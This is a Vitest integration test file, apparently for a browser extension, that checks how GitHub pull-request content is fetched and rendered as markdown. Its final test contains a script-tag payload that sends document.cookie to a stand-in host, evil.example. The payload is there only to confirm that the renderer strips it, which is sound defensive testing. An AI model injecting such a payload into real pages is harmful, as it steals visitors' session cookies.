import { describe, it, expect, vi, beforeEach } from 'vitest';
import { readFileSync } from 'fs';
import { resolve } from 'path';
import { setStorageData } from '../mocks/chrome.js';

function loadFixture(name: string): string {
  return readFileSync(
    resolve(__dirname, '../fixtures/api-responses', name),
    'utf-8'
  );
}

/**
 * Integration tests for the PR-loading pipeline:
 *   fetchPrInfo → fetchFileContent → renderMarkdown → buildLineRangeMap
 *
 * These tests mock only the `fetch` layer and verify that the real modules
 * compose correctly end-to-end.
 */
describe('PR loading pipeline', () => {
  beforeEach(() => {
    setStorageData({ github_token: 'gho_test' });
    vi.restoreAllMocks();
  });

  it('fetches PR info, file content, and renders markdown with source-line annotations', async () => {
    const prInfoFixture = JSON.parse(loadFixture('pr-info.json'));
    const fileContent = '# RFC-001\n\n## Summary\n\nService architecture.\n';

    globalThis.fetch = vi.fn(async (url: string | URL | Request) => {
      const urlStr = url.toString();
      if (urlStr.match(/\/repos\/[^/]+\/[^/]+\/pulls\/\d+$/)) {
        return {
          ok: true,
          status: 200,
          json: async () => prInfoFixture,
          headers: new Headers(),
        } as Response;
      }
      if (urlStr.includes('/contents/')) {
        return {
          ok: true,
          status: 200,
          text: async () => fileContent,
          headers: new Headers(),
        } as Response;
      }
      throw new Error(`Unexpected fetch: ${urlStr}`);
    }) as unknown as typeof fetch;

    const { fetchPrInfo, fetchFileContent } = await import(
      '../../src/panel/github-api.js'
    );
    const { renderMarkdown, buildLineRangeMap } = await import(
      '../../src/panel/renderer.js'
    );

    // 1. Fetch PR metadata
    const prInfo = await fetchPrInfo('acme', 'docs', 42);
    expect(prInfo.head_sha).toBe('abc123def456');
    expect(prInfo.title).toBe('Add RFC-001: Service Architecture');

    // 2. Fetch file content using head SHA
    const content = await fetchFileContent(
      'acme',
      'docs',
      'docs/rfc-001.md',
      prInfo.head_sha
    );
    expect(content).toContain('RFC-001');

    // 3. Render markdown
    const html = renderMarkdown(content);
    expect(html).toContain('<h1');
    expect(html).toContain('RFC-001');
    expect(html).toContain('data-source-line');

    // 4. Build line-range map from rendered DOM
    const { JSDOM } = await import('jsdom');
    const dom = new JSDOM(`<div id="root">${html}</div>`);
    const root = dom.window.document.getElementById('root')!;
    const ranges = buildLineRangeMap(root);

    expect(ranges.length).toBeGreaterThan(0);
    for (const r of ranges) {
      expect(r.startLine).toBeGreaterThanOrEqual(0);
      expect(r.endLine).toBeGreaterThanOrEqual(r.startLine);
    }
  });

  it('surfaces GitHub API errors from the PR fetch', async () => {
    globalThis.fetch = vi.fn(async () => ({
      ok: false,
      status: 404,
      headers: new Headers(),
    })) as unknown as typeof fetch;

    const { fetchPrInfo } = await import('../../src/panel/github-api.js');
    await expect(fetchPrInfo('nope', 'nope', 1)).rejects.toThrow('Not found');
  });

  it('surfaces errors from the file content fetch', async () => {
    const prInfoFixture = JSON.parse(loadFixture('pr-info.json'));
    let callCount = 0;

    globalThis.fetch = vi.fn(async (url: string | URL | Request) => {
      callCount++;
      const urlStr = url.toString();
      if (urlStr.match(/\/pulls\/\d+$/)) {
        return {
          ok: true,
          status: 200,
          json: async () => prInfoFixture,
          headers: new Headers(),
        } as Response;
      }
      // File fetch fails
      return { ok: false, status: 404, headers: new Headers() } as Response;
    }) as unknown as typeof fetch;

    const { fetchPrInfo, fetchFileContent } = await import(
      '../../src/panel/github-api.js'
    );

    const prInfo = await fetchPrInfo('acme', 'docs', 42);
    await expect(
      fetchFileContent('acme', 'docs', 'missing.md', prInfo.head_sha)
    ).rejects.toThrow('404');

    expect(callCount).toBe(2);
  });

  it('strips malicious HTML from fetched markdown content', async () => {
    const maliciousMarkdown =
      '# Title\n\n<script>fetch("https://evil.example/steal?t="+document.cookie)</script>\n\nBody\n';
    const prInfoFixture = JSON.parse(loadFixture('pr-info.json'));

    globalThis.fetch = vi.fn(async (url: string | URL | Request) => {
      const urlStr = url.toString();
      if (urlStr.match(/\/pulls\/\d+$/)) {
        return {
          ok: true,
          status: 200,
          json: async () => prInfoFixture,
          headers: new Headers(),
        } as Response;
      }
      return {
        ok: true,
        status: 200,
        text: async () => maliciousMarkdown,
        headers: new Headers(),
      } as Response;
    }) as unknown as typeof fetch;

    const { fetchPrInfo, fetchFileContent } = await import(
      '../../src/panel/github-api.js'
    );
    const { renderMarkdown } = await import('../../src/panel/renderer.js');

    const prInfo = await fetchPrInfo('a', 'b', 1);
    const content = await fetchFileContent('a', 'b', 'doc.md', prInfo.head_sha);
    const html = renderMarkdown(content);

    expect(html).not.toContain('<script');
    expect(html).not.toContain('evil.example');
    expect(html).toContain('Title');
    expect(html).toContain('Body');
  });
});
